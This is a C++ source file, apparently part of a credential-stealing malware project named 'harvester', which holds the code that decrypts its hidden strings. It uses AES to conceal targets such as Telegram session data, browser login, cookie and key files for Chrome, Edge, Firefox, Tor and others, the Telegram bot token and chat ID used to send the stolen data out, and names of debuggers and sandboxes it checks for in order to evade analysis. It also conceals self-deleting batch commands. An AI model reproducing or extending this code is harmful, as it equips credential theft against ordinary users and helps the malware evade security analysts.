// harvester/crypto/obfuscation.cpp – نسخة نهائية تدعم المعرفات حتى 73
#include "obfuscation.h"
#include "../../generated_obfuscation.h"
#include <windows.h>
#include <wincrypt.h>
#include <cstring>
#include <vector>

#pragma comment(lib, "crypt32.lib")

std::string DecryptString(const std::vector<unsigned char>& cipher,
                          const std::vector<unsigned char>& iv,
                          const std::vector<unsigned char>& key) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return "";
    
    struct AesBlob {
        BLOBHEADER hdr;
        DWORD keyLen;
        BYTE keyBytes[32];
    } blob;
    blob.hdr.bType = PLAINTEXTKEYBLOB;
    blob.hdr.bVersion = CUR_BLOB_VERSION;
    blob.hdr.reserved = 0;
    blob.hdr.aiKeyAlg = CALG_AES_256;
    blob.keyLen = 32;
    memcpy(blob.keyBytes, key.data(), 32);
    
    if (!CryptImportKey(hProv, (BYTE*)&blob, sizeof(blob), 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    std::vector<BYTE> data = cipher;
    DWORD dataLen = (DWORD)data.size();
    if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data.data(), &dataLen)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    
    return std::string((char*)data.data(), dataLen);
}

std::string GetObfuscatedString(int id) {
    std::vector<unsigned char> iv(OBF_IV, OBF_IV + sizeof(OBF_IV));
    std::vector<unsigned char> key(OBF_KEY, OBF_KEY + sizeof(OBF_KEY));
    
    switch (id) {
    case STR_TDATA: {
        std::vector<unsigned char> cipher(OBF_STR_1, OBF_STR_1 + OBF_STR_1_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_TELEGRAM_DESKTOP: {
        std::vector<unsigned char> cipher(OBF_STR_2, OBF_STR_2 + OBF_STR_2_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_API_TELEGRAM: {
        std::vector<unsigned char> cipher(OBF_STR_3, OBF_STR_3 + OBF_STR_3_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BOT_TOKEN_PLACE: {
        std::vector<unsigned char> cipher(OBF_STR_4, OBF_STR_4 + OBF_STR_4_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_SEND_DOCUMENT: {
        std::vector<unsigned char> cipher(OBF_STR_5, OBF_STR_5 + OBF_STR_5_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CHROME: {
        std::vector<unsigned char> cipher(OBF_STR_6, OBF_STR_6 + OBF_STR_6_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_EDGE: {
        std::vector<unsigned char> cipher(OBF_STR_7, OBF_STR_7 + OBF_STR_7_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BRAVE: {
        std::vector<unsigned char> cipher(OBF_STR_8, OBF_STR_8 + OBF_STR_8_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_OPERA: {
        std::vector<unsigned char> cipher(OBF_STR_9, OBF_STR_9 + OBF_STR_9_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_VIVALDI: {
        std::vector<unsigned char> cipher(OBF_STR_10, OBF_STR_10 + OBF_STR_10_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_SAFARI: {
        std::vector<unsigned char> cipher(OBF_STR_11, OBF_STR_11 + OBF_STR_11_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_TOR_BROWSER: {
        std::vector<unsigned char> cipher(OBF_STR_12, OBF_STR_12 + OBF_STR_12_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CHROMIUM: {
        std::vector<unsigned char> cipher(OBF_STR_13, OBF_STR_13 + OBF_STR_13_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_EPIC: {
        std::vector<unsigned char> cipher(OBF_STR_14, OBF_STR_14 + OBF_STR_14_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_OPERA_GX: {
        std::vector<unsigned char> cipher(OBF_STR_15, OBF_STR_15 + OBF_STR_15_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CHROME_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_16, OBF_STR_16 + OBF_STR_16_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_EDGE_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_17, OBF_STR_17 + OBF_STR_17_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BRAVE_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_18, OBF_STR_18 + OBF_STR_18_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_OPERA_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_19, OBF_STR_19 + OBF_STR_19_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_VIVALDI_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_20, OBF_STR_20 + OBF_STR_20_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_SAFARI_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_21, OBF_STR_21 + OBF_STR_21_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_TOR_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_22, OBF_STR_22 + OBF_STR_22_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CHROMIUM_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_23, OBF_STR_23 + OBF_STR_23_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_EPIC_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_24, OBF_STR_24 + OBF_STR_24_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_OPERA_GX_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_25, OBF_STR_25 + OBF_STR_25_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_LOCAL_STATE: {
        std::vector<unsigned char> cipher(OBF_STR_26, OBF_STR_26 + OBF_STR_26_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_LOGIN_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_27, OBF_STR_27 + OBF_STR_27_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_COOKIES: {
        std::vector<unsigned char> cipher(OBF_STR_28, OBF_STR_28 + OBF_STR_28_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_WEB_DATA: {
        std::vector<unsigned char> cipher(OBF_STR_29, OBF_STR_29 + OBF_STR_29_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_FIREFOX_PROFILES: {
        std::vector<unsigned char> cipher(OBF_STR_30, OBF_STR_30 + OBF_STR_30_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_KEY4_DB: {
        std::vector<unsigned char> cipher(OBF_STR_31, OBF_STR_31 + OBF_STR_31_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_LOGINS_JSON: {
        std::vector<unsigned char> cipher(OBF_STR_32, OBF_STR_32 + OBF_STR_32_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_COOKIES_SQLITE: {
        std::vector<unsigned char> cipher(OBF_STR_33, OBF_STR_33 + OBF_STR_33_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CANNOT_OPEN_FILE: {
        std::vector<unsigned char> cipher(OBF_STR_34, OBF_STR_34 + OBF_STR_34_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CANNOT_READ_FILE: {
        std::vector<unsigned char> cipher(OBF_STR_35, OBF_STR_35 + OBF_STR_35_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_ATTEMPT: {
        std::vector<unsigned char> cipher(OBF_STR_36, OBF_STR_36 + OBF_STR_36_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_FAILED_RESPONSE: {
        std::vector<unsigned char> cipher(OBF_STR_37, OBF_STR_37 + OBF_STR_37_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_SEND_SUCCESS: {
        std::vector<unsigned char> cipher(OBF_STR_38, OBF_STR_38 + OBF_STR_38_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_SEND_FAILED: {
        std::vector<unsigned char> cipher(OBF_STR_39, OBF_STR_39 + OBF_STR_39_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_POWERSHELL_COMPRESS: {
        std::vector<unsigned char> cipher(OBF_STR_40, OBF_STR_40 + OBF_STR_40_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_VMTOOLSD: {
        std::vector<unsigned char> cipher(OBF_STR_41, OBF_STR_41 + OBF_STR_41_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_PROCMON: {
        std::vector<unsigned char> cipher(OBF_STR_42, OBF_STR_42 + OBF_STR_42_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_PROCEXP: {
        std::vector<unsigned char> cipher(OBF_STR_43, OBF_STR_43 + OBF_STR_43_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_WIRESHARK: {
        std::vector<unsigned char> cipher(OBF_STR_44, OBF_STR_44 + OBF_STR_44_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_X64DBG: {
        std::vector<unsigned char> cipher(OBF_STR_45, OBF_STR_45 + OBF_STR_45_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_OLLYDBG: {
        std::vector<unsigned char> cipher(OBF_STR_46, OBF_STR_46 + OBF_STR_46_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_IDA: {
        std::vector<unsigned char> cipher(OBF_STR_47, OBF_STR_47 + OBF_STR_47_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_WINDBG: {
        std::vector<unsigned char> cipher(OBF_STR_48, OBF_STR_48 + OBF_STR_48_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_VBOXSERVICE: {
        std::vector<unsigned char> cipher(OBF_STR_49, OBF_STR_49 + OBF_STR_49_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_SANDBOX: {
        std::vector<unsigned char> cipher(OBF_STR_50, OBF_STR_50 + OBF_STR_50_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_MALWARE: {
        std::vector<unsigned char> cipher(OBF_STR_51, OBF_STR_51 + OBF_STR_51_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_ANALYSIS: {
        std::vector<unsigned char> cipher(OBF_STR_52, OBF_STR_52 + OBF_STR_52_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_VIRUS: {
        std::vector<unsigned char> cipher(OBF_STR_53, OBF_STR_53 + OBF_STR_53_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_TEST: {
        std::vector<unsigned char> cipher(OBF_STR_54, OBF_STR_54 + OBF_STR_54_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_USER: {
        std::vector<unsigned char> cipher(OBF_STR_55, OBF_STR_55 + OBF_STR_55_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_VIRTUAL: {
        std::vector<unsigned char> cipher(OBF_STR_56, OBF_STR_56 + OBF_STR_56_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_KEY_DATAS: {
        std::vector<unsigned char> cipher(OBF_STR_57, OBF_STR_57 + OBF_STR_57_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_MAP_PREFIX: {
        std::vector<unsigned char> cipher(OBF_STR_58, OBF_STR_58 + OBF_STR_58_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BAT_ECHO_OFF: {
        std::vector<unsigned char> cipher(OBF_STR_59, OBF_STR_59 + OBF_STR_59_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BAT_LOOP: {
        std::vector<unsigned char> cipher(OBF_STR_60, OBF_STR_60 + OBF_STR_60_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BAT_DEL: {
        std::vector<unsigned char> cipher(OBF_STR_61, OBF_STR_61 + OBF_STR_61_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BAT_IF_EXIST: {
        std::vector<unsigned char> cipher(OBF_STR_62, OBF_STR_62 + OBF_STR_62_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BAT_GOTO_LOOP: {
        std::vector<unsigned char> cipher(OBF_STR_63, OBF_STR_63 + OBF_STR_63_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BAT_DEL_SELF: {
        std::vector<unsigned char> cipher(OBF_STR_64, OBF_STR_64 + OBF_STR_64_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_USER_AGENT: {
        std::vector<unsigned char> cipher(OBF_STR_65, OBF_STR_65 + OBF_STR_65_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_MULTIPART_BOUNDARY: {
        std::vector<unsigned char> cipher(OBF_STR_66, OBF_STR_66 + OBF_STR_66_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CONTENT_DISPOSITION_CHAT: {
        std::vector<unsigned char> cipher(OBF_STR_67, OBF_STR_67 + OBF_STR_67_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CONTENT_DISPOSITION_DOC: {
        std::vector<unsigned char> cipher(OBF_STR_68, OBF_STR_68 + OBF_STR_68_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CONTENT_TYPE_ZIP: {
        std::vector<unsigned char> cipher(OBF_STR_69, OBF_STR_69 + OBF_STR_69_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_WILDCARD_DEST: {
        std::vector<unsigned char> cipher(OBF_STR_70, OBF_STR_70 + OBF_STR_70_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_BOT_TOKEN: {
        std::vector<unsigned char> cipher(OBF_STR_71, OBF_STR_71 + OBF_STR_71_LEN);
        return DecryptString(cipher, iv, key);
    }
    case STR_CHAT_ID: {
        std::vector<unsigned char> cipher(OBF_STR_72, OBF_STR_72 + OBF_STR_72_LEN);
        return DecryptString(cipher, iv, key);
    }
    default:
        return "";
    }
}